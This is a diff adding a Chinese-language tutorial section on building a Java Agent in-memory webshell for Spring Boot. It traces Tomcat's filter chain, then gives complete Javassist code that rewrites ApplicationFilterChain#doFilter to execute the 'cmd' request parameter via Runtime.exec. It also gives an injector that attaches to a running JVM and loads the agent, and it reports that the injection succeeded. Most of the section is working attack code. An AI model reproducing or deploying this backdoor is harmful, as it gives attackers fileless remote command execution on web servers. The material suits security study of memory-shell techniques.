@@ -649,17 +649,171 @@ premain和agentmain两种方式**修改字节码**的时机都是类文件加载
 5. 可以修改方法体
 
 说白了就是，，只能改方法体。
+# Agent内存马
+现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。
 
+这里我们以Spring Boot为例，来实现一个Agent内存马
+## Spring Boot中的Tomcat
 
+我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下
+```
+Context:20, Context_Learn (com.example.spring_controller)
+...
+(org.springframework.web.servlet.mvc.method.annotation)
+handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
+handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)
+doDispatch:1067, DispatcherServlet (org.springframework.web.servlet)
+doService:963, DispatcherServlet (org.springframework.web.servlet)
+processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
+doGet:898, FrameworkServlet (org.springframework.web.servlet)
+service:655, HttpServlet (javax.servlet.http)
+service:883, FrameworkServlet (org.springframework.web.servlet)
+service:764, HttpServlet (javax.servlet.http)
+internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
+internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
+doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
+doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
+internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
+doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
+doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
+internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
+doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
+doFilter:117, OncePerRequestFilter (org.springframework.web.filter)
+internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
+doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
+...
+```
+可以看到会按照责任链机制反复调用`ApplicationFilterChain#doFilter()`方法
+```java
+public void doFilter(ServletRequest request, ServletResponse response)
+        throws IOException, ServletException {
+ 
+        if( Globals.IS_SECURITY_ENABLED ) {
+            final ServletRequest req = request;
+            final ServletResponse res = response;
+            try {
+                java.security.AccessController.doPrivileged(
+                        (java.security.PrivilegedExceptionAction<Void>) () -> {
+                            internalDoFilter(req,res);
+                            return null;
+                        }
+                );
+            } ...
+            }
+        } else {
+            internalDoFilter(request,response);
+        }
+    }
+```
+跟到internalDoFilter()方法中
+```java
+private void internalDoFilter(ServletRequest request,
+                                  ServletResponse response)
+        throws IOException, ServletException {
+ 
+        // Call the next filter if there is one
+        if (pos < n) {
+            ...
+        }
+}
+```
+以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用
 
+### 利用Java Agent实现Spring Filter内存马
 
+我们复用上面的agentmain-Agent，修改字节码的关键在于`transformer()`方法，因此我们重写该方法即可
+```java
+package com.java.agentmain.instrumentation.transformer;
+ 
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+ 
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+ 
+public class Filter_Transform implements ClassFileTransformer {
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        try {
+ 
+            //获取CtClass 对象的容器 ClassPool
+            ClassPool classPool = ClassPool.getDefault();
+ 
+            //添加额外的类搜索路径
+            if (classBeingRedefined != null) {
+                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
+                classPool.insertClassPath(ccp);
+            }
+ 
+            //获取目标类
+            CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");
+ 
+            //获取目标方法
+            CtMethod ctMethod = ctClass.getDeclaredMethod("doFilter");
+ 
+            //设置方法体
+            String body = "{" +
+                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
+                    "String cmd=request.getParameter(\"cmd\");\n" +
+                    "if (cmd !=null){\n" +
+                    "  Runtime.getRuntime().exec(cmd);\n" +
+                    "  }"+
+                    "}";
+            ctMethod.setBody(body);
+ 
+            //返回目标类字节码
+            byte[] bytes = ctClass.toBytecode();
+            return bytes;
+ 
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return null;
+    }
+}
+```
+Inject_Agent_Spring类如下
+```java
+package com.java.inject;
+ 
+import com.sun.tools.attach.*;
+ 
+import java.io.IOException;
+import java.util.List;
+ 
+public class Inject_Agent_Spring {
+    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
+        //调用VirtualMachine.list()获取正在运行的JVM列表
+        List<VirtualMachineDescriptor> list = VirtualMachine.list();
+        for(VirtualMachineDescriptor vmd : list){
+ 
+            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
+            if(vmd.displayName().equals("com.example.java_agent_springboot.JavaAgentSpringBootApplication")){
+ 
+                //连接指定JVM
+                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
+                //加载Agent
+                virtualMachine.loadAgent("out/artifacts/Java_Agent_jar/Java_Agent.jar");
+                //断开JVM连接
+                virtualMachine.detach();
+            }
+//            System.out.println(vmd.displayName());
+ 
+        }
+    }
+}
+```
+启动一个简单的Spring Boot项目
 
-
-
-
-
-
-
+运行`Inject_Agent_Spring`类，在doFilter方法中注入恶意代码，成功执行
 
 
 
